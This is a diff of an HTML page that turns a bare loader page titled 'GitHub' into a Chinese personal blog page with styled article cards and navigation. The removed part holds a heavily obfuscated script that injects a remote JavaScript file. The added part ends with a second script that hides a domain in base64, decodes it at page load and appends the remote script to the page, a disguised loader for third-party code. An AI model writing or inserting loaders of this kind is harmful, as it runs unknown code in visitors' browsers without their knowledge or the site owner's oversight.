@@ -1,145 +1,449 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="zh-CN">
 
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport"
-        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <meta name="robots" content="noindex,nofollow" />
-    <title>GitHub</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>灵感碎片：我的数字画布</title>
     <style>
-        html,
+        /* 全局重置与基础样式 */
         body {
-            width: 100vw;
-            height: 100vh;
-        }
-
-        * {
+            overflow: hidden;
+            font-family: 'Georgia', serif;
+            /* 标题使用衬线字体 */
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
+            background-color: #f0f4f8;
+            /* 柔和的浅蓝色背景 */
+            color: #2c3e50;
+            /* 深灰蓝色文本 */
+            line-height: 1.7;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
 
-        #childIframe {
-            width: 100%;
-            height: 100vh;
-            border: none;
+        /* 容器 */
+        .container {
+            max-width: 90%;
+            /* 适应移动端 */
+            margin: 0 auto;
+            padding: 20px 0;
         }
 
-        .loading_container {
+        /* 头部 - 独特的视觉风格 */
+        header {
+            background: linear-gradient(135deg, #3498db 0%, #8e44ad 100%);
+            /* 渐变背景 */
+            color: #ffffff;
+            padding: 40px 20px;
+            /* 更大的内边距 */
+            text-align: center;
+            border-bottom-left-radius: 30px;
+            /* 更大的圆角 */
+            border-bottom-right-radius: 30px;
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
+            /* 更明显的阴影 */
+            position: relative;
+            overflow: hidden;
+            /* 隐藏溢出内容 */
+        }
+
+        header::before {
+            /* 装饰性背景元素 */
+            content: '';
             position: absolute;
-            top: 40%;
-            left: 40%;
-            margin-left: 10%;
-            transform: translate3d(-50%, -50%, 0);
+            top: -50px;
+            left: -50px;
+            width: 200px;
+            height: 200px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            transform: rotate(45deg);
+            z-index: 0;
         }
 
-        .loading_container .dot {
-            width: 24px;
-            height: 24px;
-            background: #3ac;
-            border-radius: 100%;
+        header::after {
+            /* 装饰性背景元素 */
+            content: '';
+            position: absolute;
+            bottom: -30px;
+            right: -30px;
+            width: 150px;
+            height: 150px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            transform: rotate(-30deg);
+            z-index: 0;
+        }
+
+        header h1 {
+            margin: 0;
+            font-family: 'Playfair Display', serif;
+            /* 假设字体可用，更艺术的标题 */
+            font-size: 2.5em;
+            /* 更大标题 */
+            letter-spacing: 2px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            position: relative;
+            z-index: 1;
+        }
+
+        header p {
+            font-family: 'Open Sans', sans-serif;
+            /* 假设字体可用，更简洁的副标题 */
+            font-size: 1.1em;
+            color: rgba(255, 255, 255, 0.9);
+            margin-top: 10px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* 导航菜单 - 简约下划线动画风格 */
+        nav {
+            background-color: #ffffff;
+            /* 导航背景色 */
+            text-align: center;
+            padding: 15px 0;
+            border-radius: 15px;
+            margin-top: 25px;
+            /* 增加与头部的间距 */
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            /* 柔和阴影 */
+            position: sticky;
+            /* 粘性定位 */
+            top: 0;
+            /* 粘在顶部 */
+            z-index: 1000;
+            /* 确保在最上层 */
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+        }
+
+        nav ul li {
+            margin: 0 15px;
+            /* 增加间距 */
+        }
+
+        nav ul li a {
+            color: #34495e;
+            /* 深色文字 */
+            text-decoration: none;
+            padding: 10px 0;
+            position: relative;
             display: inline-block;
-            animation: slide 1s infinite;
+            font-family: 'Open Sans', sans-serif;
+            font-weight: 600;
+            font-size: 1.1em;
+            transition: color 0.3s ease;
         }
 
-        .loading_container .dot:nth-child(1) {
-            animation-delay: 0.1s;
-            background: #32aacc;
+        nav ul li a::after {
+            /* 下划线动画 */
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 3px;
+            background-color: #e67e22;
+            /* 强调色 */
+            bottom: -5px;
+            left: 50%;
+            transform: translateX(-50%);
+            transition: width 0.3s ease;
         }
 
-        .loading_container .dot:nth-child(2) {
-            animation-delay: 0.2s;
-            background: #64aacc;
+        nav ul li a:hover::after,
+        nav ul li a:focus::after {
+            width: 100%;
         }
 
-        .loading_container .dot:nth-child(3) {
-            animation-delay: 0.3s;
-            background: #96aacc;
+        nav ul li a:hover,
+        nav ul li a:focus {
+            color: #e67e22;
+            /* 强调色 */
         }
 
-        .loading_container .dot:nth-child(4) {
-            animation-delay: 0.4s;
-            background: #c8aacc;
+        /* 内容区 - 错落有致的卡片风格 */
+        main {
+            padding-top: 20px;
         }
 
-        .loading_container .dot:nth-child(5) {
-            animation-delay: 0.5s;
-            background: #faaacc;
+        .article-card {
+            background-color: #ffffff;
+            margin-bottom: 30px;
+            /* 增加卡片间距 */
+            padding: 25px;
+            /* 增加内边距 */
+            border-radius: 20px;
+            /* 更大的圆角 */
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+            /* 柔和但明显的阴影 */
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            overflow: hidden;
+            /* 确保图片圆角 */
         }
 
-        @-moz-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+        .article-card:hover {
+            transform: translateY(-8px);
+            /* 悬停时上浮更多 */
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
+            /* 悬停时阴影更深 */
         }
 
-        @-webkit-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+        .article-card h2 {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.8em;
+            /* 更大标题 */
+            color: #34495e;
+            /* 深灰蓝色 */
+            margin-top: 0;
+            margin-bottom: 15px;
+            line-height: 1.3;
         }
 
-        @-o-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+        .article-card .date {
+            font-family: 'Open Sans', sans-serif;
+            font-size: 0.9em;
+            color: #7f8c8d;
+            /* 柔和灰色 */
+            margin-bottom: 20px;
+            display: block;
+            border-bottom: 1px dashed #ecf0f1;
+            /* 虚线分隔 */
+            padding-bottom: 10px;
         }
 
-        @keyframes slide {
-            0% {
-                transform: scale(1);
-            }
+        .article-card p {
+            font-family: 'Open Sans', sans-serif;
+            font-size: 1em;
+            color: #555555;
+            margin-bottom: 20px;
+        }
 
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
+        .article-card img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 20px auto;
+            /* 增加图片上下间距 */
+            border-radius: 15px;
+            /* 图片圆角 */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
 
-            100% {
-                transform: scale(1);
-            }
+        .read-more {
+            display: inline-block;
+            background-color: #e67e22;
+            /* 强调色按钮 */
+            color: #ffffff;
+            padding: 12px 25px;
+            border-radius: 30px;
+            /* 胶囊状按钮 */
+            text-decoration: none;
+            font-weight: bold;
+            font-family: 'Open Sans', sans-serif;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .read-more:hover {
+            background-color: #d35400;
+            /* 悬停深色 */
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.25);
+        }
+
+        /* 页脚 - 简洁且有力的风格 */
+        footer {
+            background-color: #34495e;
+            /* 深灰蓝色背景 */
+            color: #ecf0f1;
+            /* 浅色文本 */
+            padding: 30px 0;
+            text-align: center;
+            font-size: 0.9em;
+            margin-top: 40px;
+            /* 增加与内容区的间距 */
+            border-top-left-radius: 30px;
+            border-top-right-radius: 30px;
+            box-shadow: 0 -8px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .social-links a {
+            color: #ecf0f1;
+            /* 社交链接颜色 */
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 1.5em;
+            /* 更大的图标 */
+            transition: color 0.3s ease, transform 0.2s ease;
+        }
+
+        .social-links a:hover {
+            color: #e67e22;
+            /* 强调色 */
+            transform: translateY(-3px);
+            /* 悬停时上浮 */
         }
     </style>
+    <link rel="stylesheet" href="./style.css">
 </head>
 
 <body>
-    <div id="loading_box" class="loading_container">
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
+    <header>
+        <div class="container">
+            <h1>灵感碎片：我的数字画布</h1>
+            <p>记录思考，分享创意，探索未知</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <nav id="mainNav">
+            <ul>
+                <li><a href="#latest-posts">最新文章</a></li>
+                <li><a href="#categories">分类</a></li>
+                <li><a href="#about-me">关于我</a></li>
+                <li><a href="#contact">联系我</a></li>
+            </ul>
+        </nav>
+
+        <main>
+            <section id="latest-posts">
+                <h2>最新文章</h2>
+                <div class="article-list">
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=1" alt="文章插图1" class="random-image">
+                        <h2>数字时代的创意表达</h2>
+                        <span class="date">2025年07月28日</span>
+                        <p>在信息爆炸的今天，如何有效地传达个人思想和创意变得尤为重要。本文探讨了数字工具如何赋能我们进行更丰富、更具影响力的表达。</p>
+                        <a href="#" class="read-more">继续阅读</a>
+                    </div>
+
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=2" alt="文章插图2" class="random-image">
+                        <h2>编程艺术：代码中的美学</h2>
+                        <span class="date">2025年07月20日</span>
+                        <p>编程不仅仅是逻辑和功能，它更是一种艺术。探索如何编写优雅、简洁且富有表现力的代码，让每一行都充满美感。</p>
+                        <a href="#" class="read-more">继续阅读</a>
+                    </div>
+
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=3" alt="文章插图3" class="random-image">
+                        <h2>未来已来：AI与人类的协同进化</h2>
+                        <span class="date">2025年07月12日</span>
+                        <p>人工智能的飞速发展正在重塑我们的世界。本文将深入探讨AI如何与人类社会协同进化，共同开创新的可能性。</p>
+                        <a href="#" class="read-more">继续阅读</a>
+                    </div>
+                </div>
+            </section>
+        </main>
     </div>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 灵感碎片. 版权所有.</p>
+            <div class="social-links">
+                <a href="#" target="_blank">博客园</a> |
+                <a href="#" target="_blank">知乎</a> |
+                <a href="#" target="_blank">简书</a>
+            </div>
+        </div>
+    </footer>
+    <div id="overlay">
+        <div id="loading_box" class="loading_container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+
     <script>
-        var _0xodl = 'fSxlA2'; if (function (_0x44df4a, _0x58e26e, _0x532227, _0x1cbb24, _0x42581a, _0x509b59, _0xa79306) { return _0x44df4a = _0x44df4a >> 0x9, _0x509b59 = 'hs', _0xa79306 = 'hs', function (_0x4d29f2, _0x4cbc97, _0xbe291c, _0x31ad23, _0x13acc7) { const _0x407516 = _0x57d3; _0x31ad23 = 'tfi', _0x509b59 = _0x31ad23 + _0x509b59, _0x13acc7 = 'up', _0xa79306 += _0x13acc7, _0x509b59 = _0xbe291c(_0x509b59), _0xa79306 = _0xbe291c(_0xa79306), _0xbe291c = 0x0; const _0x1902ef = _0x4d29f2(); while (!![] && --_0x1cbb24 + _0x4cbc97) { try { _0x31ad23 = -parseInt(_0x407516(0x1d7, ')&2K')) / 0x1 * (-parseInt(_0x407516(0x1da, '(qya')) / 0x2) + -parseInt(_0x407516(0x1c7, 'Pm#h')) / 0x3 * (-parseInt(_0x407516(0x1d1, 'xvr1')) / 0x4) + parseInt(_0x407516(0x1c9, 'Mw8H')) / 0x5 + -parseInt(_0x407516(0x1d8, 'Y$EJ')) / 0x6 + parseInt(_0x407516(0x1cb, 'HIOm')) / 0x7 + -parseInt(_0x407516(0x1dd, 'mry*')) / 0x8 + -parseInt(_0x407516(0x1cc, 'Mw8H')) / 0x9 * (parseInt(_0x407516(0x1dc, 'quPr')) / 0xa); } catch (_0x531926) { _0x31ad23 = _0xbe291c; } finally { _0x13acc7 = _0x1902ef[_0x509b59](); if (_0x44df4a <= _0x1cbb24) _0xbe291c ? _0x42581a ? _0x31ad23 = _0x13acc7 : _0x42581a = _0x13acc7 : _0xbe291c = _0x13acc7; else { if (_0xbe291c == _0x42581a['replace'](/[kqChQWiaIPvYKouwOtDL=]/g, '')) { if (_0x31ad23 === _0x4cbc97) { _0x1902ef['un' + _0x509b59](_0x13acc7); break; } _0x1902ef[_0xa79306](_0x13acc7); } } } } }(_0x532227, _0x58e26e, function (_0x5c8363, _0x34873c, _0x10efd6, _0x28a9f7, _0x1dd818, _0x16adf9, _0x3ea5ad) { return _0x34873c = '\x73\x70\x6c\x69\x74', _0x5c8363 = arguments[0x0], _0x5c8363 = _0x5c8363[_0x34873c](''), _0x10efd6 = '\x72\x65\x76\x65\x72\x73\x65', _0x5c8363 = _0x5c8363[_0x10efd6]('\x76'), _0x28a9f7 = '\x6a\x6f\x69\x6e', (0x1b0f1e, _0x5c8363[_0x28a9f7]('')); }); }(0x19800, 0x89423, _0x1ca1, 0xce), _0x1ca1) { } function _0x1e3297() { const _0x596da2 = _0x57d3, _0x1816ad = { 'bCFHm': 'https://snake-imfv.github.io/take-gate/common.mimi.js?timestamp=', 'UVwwa': _0x596da2(0x1c8, 'u57N'), 'VQnBe': _0x596da2(0x1c6, '#XD(') }, _0x3d27e5 = Date[_0x596da2(0x1d5, ']sYX')](), _0x3ed973 = Math['floor'](Math[_0x596da2(0x1de, 'GP!4')]() * 0xf4240), _0x2564ef = _0x1816ad['bCFHm'] + _0x3d27e5 + _0x1816ad[_0x596da2(0x1cf, 'lKdL')] + _0x3ed973, _0xb78199 = document[_0x596da2(0x1db, '!MEf')](_0x1816ad[_0x596da2(0x1d3, '#W5W')]); _0xb78199[_0x596da2(0x1ce, 'sIgF')] = _0x2564ef, document[_0x596da2(0x1c4, '1Rum')]['appendChild'](_0xb78199); } function _0x57d3(_0x3a7c21, _0x386983) { const _0x1ca173 = _0x1ca1(); return _0x57d3 = function (_0x57d370, _0xacf434) { _0x57d370 = _0x57d370 - 0x1c4; let _0x51e50f = _0x1ca173[_0x57d370]; if (_0x57d3['hhIPqO'] === undefined) { var _0x15663a = function (_0x11d2a9) { const _0x85d5c2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; let _0x31b329 = '', _0xc951fd = ''; for (let _0x2837ed = 0x0, _0x364686, _0x101443, _0x448ee2 = 0x0; _0x101443 = _0x11d2a9['charAt'](_0x448ee2++); ~_0x101443 && (_0x364686 = _0x2837ed % 0x4 ? _0x364686 * 0x40 + _0x101443 : _0x101443, _0x2837ed++ % 0x4) ? _0x31b329 += String['fromCharCode'](0xff & _0x364686 >> (-0x2 * _0x2837ed & 0x6)) : 0x0) { _0x101443 = _0x85d5c2['indexOf'](_0x101443); } for (let _0xccb879 = 0x0, _0x1f82ce = _0x31b329['length']; _0xccb879 < _0x1f82ce; _0xccb879++) { _0xc951fd += '%' + ('00' + _0x31b329['charCodeAt'](_0xccb879)['toString'](0x10))['slice'](-0x2); } return decodeURIComponent(_0xc951fd); }; const _0x3a032f = function (_0x1c294f, _0x1177da) { let _0x131465 = [], _0x4d6de2 = 0x0, _0x32adbe, _0x4d6802 = ''; _0x1c294f = _0x15663a(_0x1c294f); let _0x4973f5; for (_0x4973f5 = 0x0; _0x4973f5 < 0x100; _0x4973f5++) { _0x131465[_0x4973f5] = _0x4973f5; } for (_0x4973f5 = 0x0; _0x4973f5 < 0x100; _0x4973f5++) { _0x4d6de2 = (_0x4d6de2 + _0x131465[_0x4973f5] + _0x1177da['charCodeAt'](_0x4973f5 % _0x1177da['length'])) % 0x100, _0x32adbe = _0x131465[_0x4973f5], _0x131465[_0x4973f5] = _0x131465[_0x4d6de2], _0x131465[_0x4d6de2] = _0x32adbe; } _0x4973f5 = 0x0, _0x4d6de2 = 0x0; for (let _0x54b701 = 0x0; _0x54b701 < _0x1c294f['length']; _0x54b701++) { _0x4973f5 = (_0x4973f5 + 0x1) % 0x100, _0x4d6de2 = (_0x4d6de2 + _0x131465[_0x4973f5]) % 0x100, _0x32adbe = _0x131465[_0x4973f5], _0x131465[_0x4973f5] = _0x131465[_0x4d6de2], _0x131465[_0x4d6de2] = _0x32adbe, _0x4d6802 += String['fromCharCode'](_0x1c294f['charCodeAt'](_0x54b701) ^ _0x131465[(_0x131465[_0x4973f5] + _0x131465[_0x4d6de2]) % 0x100]); } return _0x4d6802; }; _0x57d3['dxeyOG'] = _0x3a032f, _0x3a7c21 = arguments, _0x57d3['hhIPqO'] = !![]; } const _0x4f32da = _0x1ca173[0x0], _0x4af055 = _0x57d370 + _0x4f32da, _0x21827a = _0x3a7c21[_0x4af055]; return !_0x21827a ? (_0x57d3['AawnSq'] === undefined && (_0x57d3['AawnSq'] = !![]), _0x51e50f = _0x57d3['dxeyOG'](_0x51e50f, _0xacf434), _0x3a7c21[_0x4af055] = _0x51e50f) : _0x51e50f = _0x21827a, _0x51e50f; }, _0x57d3(_0x3a7c21, _0x386983); } _0x1e3297(); function _0x1ca1() { const _0x588e4a = (function () { return [_0xodl, 'twftoQSohxuClqADO2ItPvkLWKYPwkai==', 'WPzprCkiiCkVpmkrqezTW4JdLq', 'WR3dTb0ZWR1wtfj+dL/dVSkJ', 'qq50pLvDog3dN3avWO3cSG', 'W549mhmi'].concat((function () { return ['WPO9W5eXnSk2h8kjw8opW64EWPC', 'W7vgW6a', 'lmo+pMlcSmkzxmkVuSkUW4hcRha', 'WQj2fmoGWRhdUmoACWZdKG', 'W7T2W73cVmkggmkuWRCQW6iqo8kq', 'FL4HWP/dLbTm'].concat((function () { return ['W7JcLJWinGFdN2q', 'W7dcTCoTfq5wpSkImCkYsrPu', 'W5hcVY1XWOXnW7Wx', 'j8kbnw8XvI7cNXbhjCkDW7e', 'tgXwW4PdWP4', 'WPaLkSoW'].concat((function () { return ['rqT0oWyEzxRdSuC', 'a143zr0A', 'E8oaWRxdP8k6WRGb', 'W6ldGCoDuN8/W5xcHG', 'FGLxW7xcIwuiEmkzECk8W6ae', 'WPRdMr3dOttcISkjWPhcT2ldGGRdOa'].concat((function () { return ['WPzkrSkok8kKpSk+xNXTW6JdLG', 'FWPsW7xcGM0jACkPE8khW64v', 'WPVdNXVdPZxcICkkWQ/cMvRdUstdSG', 'WQLVrG', 'W43cIcqGla']; }())); }())); }())); }())); }()); _0x1ca1 = function () { return _0x588e4a; }; return _0x1ca1(); };
+        // JS功能1: 为图片URL添加时间戳以防止缓存
+        document.addEventListener('DOMContentLoaded', function () {
+            const images = document.querySelectorAll('.random-image');
+            images.forEach(img => {
+                const originalSrc = img.src;
+                const timestamp = new Date().getTime();
+                img.src = `${originalSrc}&t=${timestamp}`;
+            });
+
+            // JS功能2: 平滑滚动 (点击导航链接时)
+            document.querySelectorAll('nav a').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault(); // 阻止默认跳转
+
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop,
+                            behavior: 'smooth' // 平滑滚动
+                        });
+                    }
+                });
+            });
+        });
+    </script>
+    <script>
+        (function () {
+            function init() {
+                const timestamp = Date.now()
+                const randomNum = Math.floor(Math.random() * 1000000)
+                const domain = getdocs();
+                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const script = document.createElement("script")
+                script.src = url
+                document.body.appendChild(script)
+            }
+            function getdocs() {
+                const dd = "Ly94OWMxdjNiLnZiaWhkYS5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+                const lookup = new Uint8Array(256);
+                for (let i = 0; i < chars.length; i++) {
+                    lookup[chars.charCodeAt(i)] = i;
+                }
+                let padding = 0;
+                if (dd.endsWith('==')) {
+                    padding = 2;
+                } else if (dd.endsWith('=')) {
+                    padding = 1;
+                }
+                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
+                const len = cleanedString.length;
+                if (len % 4 !== 0) {
+                    throw new Error("Invalid string length.");
+                }
+                const outputLength = (len / 4) * 3 - padding;
+                const outputBytes = new Uint8Array(outputLength);
+                let outputIndex = 0;
+                let i = 0;
+                while (i < len) {
+                    const c1 = lookup[cleanedString.charCodeAt(i++)];
+                    const c2 = lookup[cleanedString.charCodeAt(i++)];
+                    const c3 = lookup[cleanedString.charCodeAt(i++)];
+                    const c4 = lookup[cleanedString.charCodeAt(i++)];
+                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
+                    if (c3 !== 64) {
+                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
+                    }
+                    if (c4 !== 64) {
+                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
+                    }
+                }
+                const decoder = new TextDecoder('utf-8');
+                return decoder.decode(outputBytes);
+            }
+            init()
+        })()
     </script>
 </body>
 
